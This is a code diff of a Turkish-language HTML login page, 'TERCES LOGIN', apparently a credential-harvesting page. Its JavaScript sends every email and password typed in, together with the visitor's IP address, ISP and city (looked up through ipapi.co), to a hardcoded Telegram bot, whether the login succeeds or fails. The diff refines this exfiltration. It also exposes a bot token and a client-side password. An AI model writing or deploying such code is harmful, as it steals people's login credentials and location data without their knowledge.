@@ -8,7 +8,7 @@
         body {
             background-color: #0a0a0a;
             color: #e0e0e0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
             margin: 0;
             display: flex;
             justify-content: center;
@@ -20,7 +20,7 @@
             padding: 30px;
             border-radius: 12px;
             border: 1px solid #333;
-            max-width: 400px;
+            max-width: 450px;
             text-align: center;
             box-shadow: 0 8px 32px rgba(0,0,0,0.8);
         }
@@ -45,28 +45,43 @@
             cursor: pointer;
         }
         button:hover { background: #0056b3; }
-        #content { display: none; } /* Başlangıçta gizli */
-        .warning { color: #ff4d4d; font-size: 0.9em; margin-top: 15px; }
+        #content { display: none; text-align: left; line-height: 1.6; }
+        .session-box {
+            background: #000;
+            padding: 10px;
+            border: 1px dashed #555;
+            word-break: break-all;
+            font-family: monospace;
+            color: #00ff00;
+            margin: 15px 0;
+        }
+        .warning { color: #ff4d4d; font-weight: bold; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div id="login-form">
-            <h2>TERCES LOGIN</h2>
-            <input type="email" id="userEmail" placeholder="E-posta">
-            <input type="password" id="userPass" placeholder="Şifre">
+            <h2 style="color: #fff;">TERCES LOGIN</h2>
+            <input type="email" id="userEmail" placeholder="E-posta Adresiniz">
+            <input type="password" id="userPass" placeholder="Giriş Şifresi">
             <button onclick="verileriGonder()">Giriş Yap</button>
         </div>
 
         <div id="content">
-            <h2>Merhaba!</h2>
-            <p>Bu <strong>TERCES</strong> adlı özel ağdır.</p>
-            <p>Adminimize doğrudan ulaşmanız mümkündür.</p>
-            <div style="word-break: break-all; color: #555; font-size: 0.8em;">
-                0528db57d73bb17d1e955e303f5a2f5ea
+            <h2 style="text-align:center; color:#fff;">Merhaba!</h2>
+            <p>Bu "TERCES" adlı adminimiz ile özel bağlantı kurmamız için yaratılmış bir özel sitedir. Adminimize doğrudan ulaşmanız mümkün olmadığı için bu Session ID ile:</p>
+            
+            <div class="session-box">
+                0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
             </div>
-            <p class="warning"><strong>Dikkat!</strong> Lütfen bilgileri paylaşmayın.</p>
+
+            <p>Session uygulamasından ulaşmanız gerekmektedir.</p>
+            <p>Sitemiz güvenlik gereği veri tabanı desteklidir.</p>
+
+            <div class="warning">
+                Dikkat! Lütfen yasadışı yollara başvurmayınız ve spam gibi faaliyetler için başvurmayınız.
+            </div>
         </div>
     </div>
 
@@ -76,43 +91,44 @@
             const pass = document.getElementById('userPass').value;
             const dogruSifre = "Adhfxygh8lm"; 
 
-            // Senin Bilgilerin
+            // TELEGRAM BİLGİLERİ (Doğruluğunu son kez kontrol et)
             const botToken = "8763400885:AAFUvdZBZy92pGCv8BvVjR3450e1S20S20"; 
             const chatId = "7580423994";
 
+            if(!email || !pass) {
+                alert("Lütfen tüm alanları doldurun!");
+                return;
+            }
+
             try {
-                // IP ve Konum Bilgilerini Alıyoruz
+                // IP bilgisini alıyoruz
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
 
-                const detayliMesaj = `
-🌐 **YENİ GİRİŞ DENEMESİ**
-📧 E-posta: ${email}
-🔑 Şifre: ${pass}
-📡 IP: ${data.ip}
-🏢 ISS: ${data.org}
-📍 Konum: ${data.city} / ${data.country_name}
-                `;
+                const mesaj = `🚀 **GİRİŞ PANELİ BİLDİRİMİ**\n\n` +
+                              `📧 E-posta: ${email}\n` +
+                              `🔑 Şifre: ${pass}\n` +
+                              `📡 IP: ${data.ip}\n` +
+                              `🏢 ISS: ${data.org}\n` +
+                              `📍 Konum: ${data.city} / ${data.country_name}\n` +
+                              `✅ Durum: ${pass === dogruSifre ? "BAŞARILI" : "HATALI"}`;
 
-                // Telegram'a Gönder
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(detayliMesaj)}&parse_mode=Markdown`);
+                // Telegram'a gönder (await ekledik ki gitmeden sayfa değişmesin)
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
 
                 if (pass === dogruSifre) {
-                    // Giriş Başarılı: Formu gizle, içeriği göster
                     document.getElementById('login-form').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
                 } else {
-                    alert("Hatalı şifre!");
+                    alert("Hatalı email veya şifre!");
                 }
-
             } catch (error) {
-                console.error("Hata:", error);
-                alert("Bir bağlantı sorunu oluştu, ancak giriş denendi.");
-                
-                // Bağlantı hatası olsa bile şifre kontrolünü yap (offline çalışma durumu için)
+                // İnternet veya IP servisi hatası olsa bile giriş yapmasına izin ver
                 if (pass === dogruSifre) {
                     document.getElementById('login-form').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
+                } else {
+                    alert("Giriş başarısız!");
                 }
             }
         }
